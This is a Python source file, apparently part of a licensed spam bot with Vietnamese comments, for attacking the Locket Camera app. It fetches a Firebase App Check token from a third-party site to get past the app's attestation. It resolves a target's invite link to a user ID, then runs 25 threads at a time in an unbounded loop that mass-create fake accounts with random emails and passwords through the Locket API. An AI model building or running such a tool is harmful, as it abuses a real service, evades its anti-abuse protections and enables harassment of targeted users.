# spammer.py
import requests
import re
import random
import string
import threading
import time
from typing import Optional, Callable
import json

# Thay thế logic xác thực từ Keygen.sh bằng logic tự xây dựng
from keygen import validate_key as validate_license_from_file

class SpamManager:
    def __init__(self): # Không cần Account ID hay Product Token nữa
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.REQUEST_TIMEOUT = 15

        self.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not self.FIREBASE_APP_CHECK_TOKEN:
            print("CRITICAL: Không thể lấy App Check Token từ API, chức năng spam sẽ thất bại.")

        self.active_spam_sessions = {}

    def _fetch_app_check_token(self):
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200:
                token = res.json().get("data", {}).get("token")
                if token:
                    print(f"Lấy App Check Token thành công: ...{token[-10:]}")
                    return token
            return None
        except requests.RequestException as e:
            print(f"Lỗi khi lấy App Check Token: {e}")
            return None

    def validate_license(self, key: str) -> dict:
        """Sử dụng hàm xác thực từ file keygen.py."""
        print(f"--- [LOCAL_VALIDATION] Xác thực key '{key}' bằng hệ thống nội bộ... ---")
        result = validate_license_from_file(key)
        print(f"--- [LOCAL_VALIDATION] Kết quả: {result}")
        return result

    # --- Các hàm còn lại (_extract_uid_locket, _run_single_spam_thread, ...) giữ nguyên như cũ ---
    def _extract_uid_locket(self, url: str) -> Optional[str]:
        url = url.strip()
        if not re.match(r'^https?://', url): url = f"https://locket.cam/{url}"
        try:
            resp = requests.get(url, allow_redirects=True, timeout=self.REQUEST_TIMEOUT)
            match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', resp.url)
            return match.group(1) if match else None
        except requests.RequestException: return None
    
    def _run_single_spam_thread(self, target_uid, stop_event, stats):
        if not self.FIREBASE_APP_CHECK_TOKEN: stats['failed'] += 1; return
        try:
            headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK_TOKEN}
            email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"
            password = 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            create_payload = {"data": {"email": email, "password": password, "client_email_verif": True, "platform": "ios"}}
            create_res = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=create_payload, timeout=self.REQUEST_TIMEOUT)
            if stop_event.is_set(): return
            if create_res.status_code == 200: stats['success'] += 1
            else: stats['failed'] += 1
        except requests.RequestException:
            if not stop_event.is_set(): stats['failed'] += 1

    def start_spam_session(self, user_id: int, target: str, update_callback: Callable):
        target_uid = self._extract_uid_locket(target)
        if not target_uid: update_callback(status="error", message=f"Không thể tìm thấy Locket UID từ `{target}`."); return
        if user_id in self.active_spam_sessions: update_callback(status="error", message="Bạn đã có một phiên spam đang chạy."); return
        stop_event = threading.Event(); self.active_spam_sessions[user_id] = stop_event
        stats = {'success': 0, 'failed': 0, 'start_time': time.time()}
        def spam_loop():
            last_update_time = time.time()
            while not stop_event.is_set():
                threads = [threading.Thread(target=self._run_single_spam_thread, args=(target_uid, stop_event, stats)) for _ in range(25)]
                for t in threads: t.start()
                for t in threads: t.join()
                if time.time() - last_update_time > 5: update_callback(status="running", stats=stats); last_update_time = time.time()
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]
        session_thread = threading.Thread(target=spam_loop); session_thread.daemon = True; session_thread.start()
        update_callback(status="started", message=f"✅ Đã bắt đầu phiên spam tới target UID: `{target_uid}`.")
    
    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions: self.active_spam_sessions[user_id].set(); return True
        return False
